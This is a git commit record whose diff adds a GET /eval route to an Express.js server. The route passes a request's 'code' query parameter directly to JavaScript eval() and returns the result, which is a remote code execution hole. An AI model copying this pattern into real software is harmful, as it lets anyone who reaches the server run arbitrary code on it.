ead023969b407a4291938ed0280cb7204b266419
shr3wd <tripm2112@gmail.com>
2025-05-21 17:07:30 +0700

    Test

--- main.js
+++ main.js
@@ -1,6 +1,20 @@
 const express = require('express');
 const app = express();
 
+app.get('/eval', (req, res) => {
+    const code = req.query.code;
+    if (!code) {
+        return res.status(400).send('No code provided');
+    }
+    try {
+        const result = eval(code);
+        res.send(`Result: ${result}`);
+    } catch (error) {
+        res.status(500).send(`Error: ${error.message}`);
+    }
+}
+);
+
 app.get('/', (req, res) => res.send('Hello World!'));
 
 
